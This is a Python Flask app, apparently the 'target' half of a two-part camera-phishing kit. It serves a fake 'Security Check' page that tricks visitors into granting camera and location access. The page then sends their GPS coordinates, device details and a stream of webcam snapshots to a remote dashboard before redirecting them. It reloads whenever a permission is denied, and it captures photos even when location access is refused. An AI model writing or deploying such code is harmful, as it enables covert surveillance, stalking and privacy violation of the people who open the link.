# APP 2 (TARGET/SLAVE APP) - by:@ROMEO_UCHIHA
from flask import Flask, render_template_string, request, jsonify
import requests

app = Flask(__name__)

# ---> ⚠️ YAHAN APNI MAIN DASHBOARD WALI VERCEL URL DALO ⚠️ <---
MAIN_APP_URL = "https://camera.vercel.app" 

@app.route("/")
def home():
    return "Target System Online."

# --- PROXY ROUTES (CORS Bypass: Target Browser -> App 2 -> App 1) ---
def forward_to_main(endpoint, l_id, data):
    try:
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        headers = {'X-Forwarded-For': client_ip, 'Content-Type': 'application/json'}
        requests.post(f"{MAIN_APP_URL}/api/{endpoint}/{l_id}", json=data, headers=headers, timeout=5)
    except Exception as e:
        print("Proxy Error:", e)

@app.route("/proxy_hw/<l_id>", methods=["POST"])
def proxy_hw(l_id):
    forward_to_main("log_hardware", l_id, request.get_json())
    return jsonify({"s": 1})

@app.route("/proxy_loc/<l_id>", methods=["POST"])
def proxy_loc(l_id):
    forward_to_main("log_loc", l_id, request.get_json())
    return jsonify({"s": 1})

@app.route("/proxy_cap/<l_id>", methods=["POST"])
def proxy_cap(l_id):
    forward_to_main("capture", l_id, request.get_json())
    return jsonify({"s": 1})

# --- TARGET UI ROUTE ---
@app.route("/t/<link_id>")
def target_page(link_id):
    # Fetch configuration from Main App
    try:
        req = requests.get(f"{MAIN_APP_URL}/api/config/{link_id}", timeout=10)
        if req.status_code != 200: return "Dashboard Connection Error!"
        config = req.json()
        if "error" in config: return "Link Expired or Not Found!"
    except:
        return "System Error (Dashboard Offline)."

    target_type = config.get("target_type", "both")
    r_url = config.get("redirect_url", "https://google.com")

    # --- UCHIHA HACK UI ---
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>System Verification</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&display=swap');
            body { background: radial-gradient(circle at center, #0a0000 0%, #000 100%); color: #0f0; font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
            .glow-box { background: rgba(10, 0, 0, 0.8); backdrop-filter: blur(10px); border: 2px solid #ff0000; border-radius: 25px; padding: 40px 30px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 0, 0.2), inset 0 0 10px rgba(255,0,0,0.1); }
            h3 { font-family: 'Orbitron'; color: #ff3333; letter-spacing: 2px; margin-bottom: 30px; }
            .item { display: flex; justify-content: space-between; align-items: center; margin: 25px 0; font-size: 1.3rem; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px; }
            .tick { color: #0f0; text-shadow: 0 0 10px #0f0; } .cross { color: #f00; text-shadow: 0 0 10px #f00; } .wait { color: #ff0; animation: spin 1s infinite linear; }
            @keyframes spin { 100% { transform: rotate(360deg); } }
            #hack-ui { display: none; text-align: center; }
            .timer { font-size: 6rem; color: #ff0000; text-shadow: 0 0 20px rgba(255,0,0,0.6); font-family: 'Orbitron'; font-weight: 900;}
            #msg { margin-top: 20px; font-size: 0.9rem; color: #888; height: 20px;}
        </style>
    </head>
    <body>
        <div id="auth-ui" class="glow-box">
            <h3>SECURITY CHECK</h3>
            <div class="item" id="cam-row" style="display:none;"><span><i class="fas fa-camera"></i> CAMERA</span><span id="cam-ico" class="wait"><i class="fas fa-sync-alt"></i></span></div>
            <div class="item" id="loc-row" style="display:none;"><span><i class="fas fa-map-marker-alt"></i> LOCATION</span><span id="loc-ico" class="wait"><i class="fas fa-sync-alt"></i></span></div>
            <p id="msg">Please allow permissions to continue...</p>
        </div>

        <div id="hack-ui">
            <h2 style="font-family: 'Orbitron'; color: #aa0000; letter-spacing: 3px;">DATA UPLINK</h2>
            <div class="timer" id="count">30</div>
            <p id="log-text" style="color: #666; margin-top: 10px;">Establishing connection...</p>
        </div>

        <video id="v" style="display:none" autoplay playsinline></video>
        <canvas id="c" style="display:none"></canvas>

        <script>
            let mode = "{{ t_type }}";
            let camReq = (mode === 'both' || mode === 'camera');
            let locReq = (mode === 'both' || mode === 'location');
            
            if(camReq) document.getElementById('cam-row').style.display = 'flex';
            if(locReq) document.getElementById('loc-row').style.display = 'flex';

            let camDone = !camReq; 
            let locDone = !locReq;
            let timeLeft = 30;
            const v = document.getElementById('v'), c = document.getElementById('c'), msg = document.getElementById('msg');
            
            window.onload = () => { getHardware(); startAuth(); };

            async function getHardware() {
                fetch("/proxy_hw/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ plat: navigator.platform, cores: navigator.hardwareConcurrency || 0 }) });
            }

            function checkAllDone() {
                if(camDone && locDone) {
                    msg.innerText = "Verification Complete."; msg.style.color = "#0f0";
                    setTimeout(startHack, 1500);
                }
            }

            async function startAuth() {
                // Request Camera
                if(camReq) {
                    try {
                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
                        document.getElementById('cam-ico').innerHTML = '<i class="fas fa-check-circle tick"></i>';
                        camDone = true;
                        checkAllDone();
                    } catch(e) { 
                        document.getElementById('cam-ico').innerHTML = '<i class="fas fa-times-circle cross"></i>'; 
                        msg.innerText = "Camera Denied. Reloading..."; msg.style.color = "#f00";
                        setTimeout(() => location.reload(), 2000); // Reload ONLY on explicit deny
                    }
                }

                // Request Location
                if(locReq) {
                    if(navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (p) => {
                                document.getElementById('loc-ico').innerHTML = '<i class="fas fa-check-circle tick"></i>';
                                fetch("/proxy_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
                                locDone = true;
                                checkAllDone();
                            },
                            (e) => {
                                document.getElementById('loc-ico').innerHTML = '<i class="fas fa-times-circle cross"></i>';
                                msg.innerText = "Location Denied. Reloading..."; msg.style.color = "#f00";
                                // If camera was approved but location denied, snap some pics before reload
                                if(camReq && camDone) startCapture(3); 
                                setTimeout(() => location.reload(), 2500); // Reload ONLY on explicit deny
                            }
                        );
                    }
                }
            }

            function takeSnap() {
                if(v.videoWidth === 0) return;
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                fetch("/proxy_cap/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: c.toDataURL('image/jpeg', 0.4) }) });
            }

            function startCapture(limit) {
                let j=0, itv = setInterval(() => { takeSnap(); j++; if(limit && j>=limit) clearInterval(itv); }, 600);
                return itv;
            }

            function startHack() {
                document.getElementById('auth-ui').style.display = 'none';
                document.getElementById('hack-ui').style.display = 'block';
                let capItv = null;
                if(camReq) capItv = startCapture(0); 

                let timer = setInterval(() => {
                    timeLeft--;
                    document.getElementById('count').innerText = timeLeft;
                    if(timeLeft <= 0) {
                        clearInterval(timer); if(capItv) clearInterval(capItv);
                        window.location.href = "{{ r_url }}";
                    }
                }, 1000);
            }
        </script>
    </body>
    </html>
    ''', t_type=target_type, r_url=r_url, l_id=link_id)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
